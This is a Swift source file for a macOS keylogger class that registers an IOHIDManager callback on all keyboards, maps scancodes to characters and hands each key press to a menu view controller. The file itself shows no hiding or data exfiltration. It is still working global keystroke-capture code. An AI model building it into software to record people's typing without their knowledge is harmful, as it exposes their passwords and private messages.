//
//  Keylogger.swift
//  Noonecares x Keylogger
//
//  Created by Skrew Everything on 14/01/17.
//  Modified by Lesterrry on 24/07/21
//  Copyright © 2017 Skrew Everything, © 2021 Lesterrry. All rights reserved.
//

import Foundation
import IOKit.hid
import Cocoa

class Keylogger {  // TODO: Sometimes all the thing just stops working until I log out and back in
    var manager: IOHIDManager!
    var deviceList = NSArray()
    fileprivate var isStarted = false
    fileprivate var isInitialized = false
    
    deinit {
        stop()
    }
    
    fileprivate func begin() {
        if isInitialized { return }
        manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))

        if (CFGetTypeID(manager) != IOHIDManagerGetTypeID())
        {
            SystemMethods.log("Couldn't create manager")
        }
        deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keyboard)) as NSArray

        IOHIDManagerSetDeviceMatchingMultiple(manager, deviceList as CFArray)
       
        let observer = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
        
        /* Input value Call Backs */
        IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
        
        /* Open HID Manager */
        let ioreturn: IOReturn = openHIDManager()
        if ioreturn != kIOReturnAborted
        {
            SystemMethods.log("Couldn't open manager: \(ioreturn)")
        }
        isInitialized = true
    }

    /* For Keyboard */
    func CreateDeviceMatchingDictionary(inUsagePage: Int, inUsage: Int) -> CFMutableDictionary {
        let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
        let resultAsCFDic: CFMutableDictionary = resultAsSwiftDic as! CFMutableDictionary
        return resultAsCFDic
    }
    
    func openHIDManager() -> IOReturn {
        return IOHIDManagerOpen(manager, IOOptionBits(kIOHIDOptionsTypeNone))
    }
    
    /* Scheduling the HID Loop */
    func start() {
        if isStarted { return }
        if !isInitialized { begin() }
        IOHIDManagerScheduleWithRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
        SystemMethods.log("Keylogger started")
        isStarted = true
    }
    
    /* Un-scheduling the HID Loop */
    func stop() {
        if !isStarted || !isInitialized { return }
        IOHIDManagerUnscheduleFromRunLoop(manager, CFRunLoopGetMain(), CFRunLoopMode.defaultMode.rawValue)
        SystemMethods.log("Keylogger stopped")
        isStarted = false
    }
    
    
    var keyMap: [UInt32:[String]] {
        var map = [UInt32:[String]]()
        map[4] =  ["a","A"]
        map[5] =  ["b","B"]
        map[6] =  ["c","C"]
        map[7] =  ["d","D"]
        map[8] =  ["e","E"]
        map[9] =  ["f","F"]
        map[10] = ["g","G"]
        map[11] = ["h","H"]
        map[12] = ["i","I"]
        map[13] = ["j","J"]
        map[14] = ["k","K"]
        map[15] = ["l","L"]
        map[16] = ["m","M"]
        map[17] = ["n","N"]
        map[18] = ["o","O"]
        map[19] = ["p","P"]
        map[20] = ["q","Q"]
        map[21] = ["r","R"]
        map[22] = ["s","S"]
        map[23] = ["t","T"]
        map[24] = ["u","U"]
        map[25] = ["v","V"]
        map[26] = ["w","W"]
        map[27] = ["x","X"]
        map[28] = ["y","Y"]
        map[29] = ["z","Z"]
        map[30] = ["1","!"]
        map[31] = ["2","@"]
        map[32] = ["3","#"]
        map[33] = ["4","$"]
        map[34] = ["5","%"]
        map[35] = ["6","^"]
        map[36] = ["7","&"]
        map[37] = ["8","*"]
        map[38] = ["9","("]
        map[39] = ["0",")"]
        map[44] = [" "," "]
        map[45] = ["-","_"]
        map[46] = ["=","+"]
        map[47] = ["[","{"]
        map[48] = ["]","}"]
        map[50] = ["",  ""]  // Keyboard Non-US# and ~2
        map[51] = [";",":"]
        map[54] = [",","<"]
        map[55] = [".",">"]
        // Keypads
        map[85] = ["*","*"]
        map[86] = ["-","-"]
        map[87] = ["+","+"]
        map[89] = ["1", ""]
        map[90] = ["2", ""]
        map[91] = ["3", ""]
        map[92] = ["4", ""]
        map[93] = ["5","5"]
        map[94] = ["6", ""]
        map[95] = ["7", ""]
        map[96] = ["8", ""]
        map[97] = ["9", ""]
        map[98] = ["0", ""]
        return map
    }
}

class CallBackFunctions {
    static var lastChar = "" // For some reason, every event gets triggered twice. I made this lazy and silly thing to avoid this.
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        let myself = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device);
        if (IOHIDElementGetUsagePage(elem) != 0x07) {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231 || scancode == 57 || (scancode >= 224 && scancode <= 231)) {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device);
        if pressed == 1 {
            if let key = myself.keyMap[scancode]?[0] {
                if key != lastChar {
                    lastChar = key
                    MenuViewController.registerKeyloggerEvent(key)
                } else {
                    lastChar = ""
                }
            }
        }
    }
}
